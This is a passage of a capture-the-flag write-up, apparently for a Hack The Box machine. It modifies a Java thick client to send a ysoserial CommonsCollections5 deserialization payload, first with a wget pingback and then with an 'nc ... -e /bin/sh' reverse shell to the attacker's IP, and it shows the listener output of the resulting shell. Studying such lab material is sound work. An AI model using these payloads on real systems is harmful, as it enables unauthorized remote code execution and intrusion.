MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  27 */     } catch (NoSuchAlgorithmException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  28 */       e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */     }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  30 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  32 */     this.password = DatatypeConverter.printHexBinary(hash);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  33 */     this.email = email;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  34 */     this.role = role;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */   }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>to</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public User(int uid, String username, String password, String email, Role role) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.uid = uid;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.username = username;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.password = password;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.email = email;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.role = role;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But I always end with this error:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">java.io.NotSerializableException: htb.fatty.shared.resources.Role</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1548)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1509)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1432)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at htb.fatty.client.methods.Invoker.changePW(Invoker.java:133)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at htb.fatty.client.gui.ClientGuiTest$16.actionPerformed(ClientGuiTest.java:442)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2022)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2348)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.AbstractButton.doClick(AbstractButton.java:376)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.plaf.basic.BasicMenuItemUI.doClick(BasicMenuItemUI.java:842)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.plaf.basic.BasicMenuItemUI$Handler.mouseReleased(BasicMenuItemUI.java:886)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Component.processMouseEvent(Component.java:6539)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at javax.swing.JComponent.processMouseEvent(JComponent.java:3324)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Component.processEvent(Component.java:6304)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Container.processEvent(Container.java:2239)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Component.dispatchEventImpl(Component.java:4889)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Container.dispatchEventImpl(Container.java:2297)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Component.dispatchEvent(Component.java:4711)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4904)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4535)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4476)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Container.dispatchEventImpl(Container.java:2283)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Window.dispatchEventImpl(Window.java:2746)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.Component.dispatchEvent(Component.java:4711)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:760)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue.access$500(EventQueue.java:97)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue$3.run(EventQueue.java:709)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue$3.run(EventQueue.java:703)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.security.AccessController.doPrivileged(Native Method)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:84)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue$4.run(EventQueue.java:733)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue$4.run(EventQueue.java:731)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.security.AccessController.doPrivileged(Native Method)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.security.ProtectionDomain$JavaSecurityAccessImpl.doIntersectionPrivilege(ProtectionDomain.java:74)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventQueue.dispatchEvent(EventQueue.java:730)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:205)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:116)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:105)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:101)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:93)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        at java.awt.EventDispatchThread.run(EventDispatchThread.java:82)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The error is hit in this chunk of code:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            ObjectOutputStream oOut = new ObjectOutputStream(bOut);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            oOut.writeObject(user);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        catch (IOException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            return &quot;Failure while serializing user object&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The user class is serializable:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public class User</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  implements Serializable</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>but not the role class</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public class Role</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As said in <a href="https://stackoverflow.com/questions/13895867/why-does-writeobject-throw-java-io-notserializableexception-and-how-do-i-fix-it" target="_blank" rel="noopener noreferrer">this stackOverflow post</a>
we either need to:</p><ul><li>make the Role class <code>Serializable</code></li><li>mark the Role field as <code>transient</code> is it&#x27;s unneeded in the serialized form</li></ul><p>So I added <code>implements Serializable</code> on the Role class, now I don&#x27;t have error
on client side but instead <code>Error: Failure while recovering the User object.</code>
because it&#x27;s a shared library so the client can now serialize it but the
server can&#x27;t deserialize it as the shared library on server side remains untouched.</p><p>So I guess we will have to not serialize it. So I marked the field as</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">implements Serializable {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    int uid;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    String username;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    String password;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    String email;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    transient Role role;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>but I ended up with the same deserialization error.</p><p>Because the server expect a user object, I thought that anything else would be
refused.</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">User user1 = (User)oIn.readObject();</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But in fact we should send our raw serialized payload without trying to package it
as the password of the user object.</p><p>So here is the final client GUI modification:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">        pwChangeButton.addActionListener(new ActionListener(){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                String response = &quot;&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    response = ClientGuiTest.this.invoker.changePW(&quot;cyfun&quot;, &quot;whatever&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                catch (MessageBuildException | MessageParseException e1) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;Failure during message building/parsing.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                catch (IOException e2) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                    JOptionPane.showMessageDialog(controlPanel, &quot;Unable to contact the server. If this problem remains, please close and reopen the client.&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                passwordChange.setVisible(false);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                controlPanel.setVisible(true);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                textPane.setText(response);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        });</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And the final <code>changePW</code> modification:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.io.File;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    public String changePW(String username, String newPassword) throws MessageParseException, MessageBuildException, IOException {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        String methodName = new Object(){}.getClass().getEnclosingMethod().getName();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger.logInfo(&quot;[+] Method &#x27;&quot; + methodName + &quot;&#x27; was called by user &#x27;&quot; + this.user.getUsername() + &quot;&#x27;.&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if (AccessCheck.checkAccess(methodName, this.user)) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            return &quot;Error: Method &#x27;&quot; + methodName + &quot;&#x27; is not allowed for this user account&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        //String data = new String(Files.readAllBytes(Paths.get(&quot;revshell.ser&quot;)));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        //data.getBytes()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        File fd = new File(&quot;revshell.ser&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        byte[] data = Files.readAllBytes(fd.toPath());</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        byte[] serializedUser64 = Base64.getEncoder().encode(data);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        System.console().writer().println(new String(serializedUser64));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        this.action = new ActionMessage(this.sessionID, &quot;changePW&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        this.action.addArgument(new String(serializedUser64));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        this.sendAndRecv();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if (this.response.hasError()) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            return &quot;Error: Your action caused an error on the application server!&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        return this.response.getContentAsString();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the first time I just generate my payload with a pingback to make sure it works.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ysoserial CommonsCollections5 &#x27;wget http://10.10.14.114:8888&#x27; &gt; revshell.ser</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now let&#x27;s try to get a reverse shell.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ysoserial CommonsCollections5 &#x27;nc 10.10.14.114 8888 -e /bin/sh&#x27; &gt; revshell.ser</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Awesome we get it:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pwncat -l 8888 -vv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on :::8888 (family 10/IPv6, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Client connected from 10.10.10.174:33803 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="system-reconnaissance">System reconnaissance<a href="#system-reconnaissance" class="hash-link" aria-label="Direct link to System reconnaissance" title="Direct link to System reconnaissance">​</a></h2><p>Looks like the shell we can get are limiteds:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /etc/shells</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># valid login shells</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/ash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>A Debian kernel on an Alpine distro? It highly seems like we are in a docker
